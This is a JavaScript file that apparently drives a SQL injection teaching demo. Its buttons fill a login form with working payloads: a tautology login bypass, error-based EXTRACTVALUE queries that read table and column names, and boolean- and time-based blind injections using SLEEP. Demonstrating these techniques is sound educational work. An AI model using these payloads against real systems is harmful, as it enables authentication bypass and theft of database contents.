window.onload = function() {
    const username = document.getElementById('username');
    const password = document.getElementById('password');

    const wrong = document.getElementById('wrong');
    wrong.onclick = () => {
        username.value = 'admin';
        password.value = 'wrong password';
    }

    const error = document.getElementById('error');
    error.onclick = () => {
        username.value = 'admin';
        password.value = '"';
    }

    const correct = document.getElementById('correct');
    correct.onclick = () => {
        username.value = 'admin';
        password.value = 'password';
    }

    const tautology = document.getElementById('tautology');
    tautology.onclick = () => {
        username.value = 'admin';
        password.value = '" OR 1=1;-- ';
    }

    const error_tables = document.getElementById('error-tables');
    error_tables.onclick = () => {
        username.value = '" AND EXTRACTVALUE("", CONCAT(":", (\n    SELECT table_name FROM information_schema.tables\n    WHERE table_schema = database() LIMIT 0, 1\n)));-- ';
        password.value = '';
    }

    const error_columns = document.getElementById('error-columns');
    error_columns.onclick = () => {
        username.value = '" AND EXTRACTVALUE("", CONCAT(":", (\n    SELECT column_name FROM information_schema.columns\n    WHERE table_schema = database()\n    AND table_name = "users" LIMIT 0,1\n)));-- "';
        password.value = '';
    }

    const btrue = document.getElementById('btrue');
    btrue.onclick = () => {
        username.value = '%" AND 1=1;-- ';
        password.value = '';
    }

    const bfalse = document.getElementById('bfalse');
    bfalse.onclick = () => {
        username.value = '%" AND 1=2;-- ';
        password.value = '';
    }

    const timebfalse = document.getElementById('timebfalse');
    timebfalse.onclick = () => {
        username.value = '" AND (\n    SELECT SLEEP(5) FROM DUAL\n    WHERE SUBSTRING(database(), 1, 1) = "a"\n);-- "';
        password.value = '';
    }

    const timebtrue = document.getElementById('timebtrue');
    timebtrue.onclick = () => {
        username.value = '" AND (\n    SELECT SLEEP(5) FROM DUAL\n    WHERE SUBSTRING(database(), 1, 1) = "s"\n);-- "';
        password.value = '';
    }

    const timetable = document.getElementById('timetable');
    timetable.onclick = () => {
        username.value = '" AND (\n    SELECT SLEEP(5) FROM DUAL\n    WHERE SUBSTRING((\n        SELECT table_name FROM information_schema.tables\n        WHERE table_schema = database() LIMIT 0, 1)\n    , 1, 1) > "k"\n);-- "';
        password.value = '';
    }
}
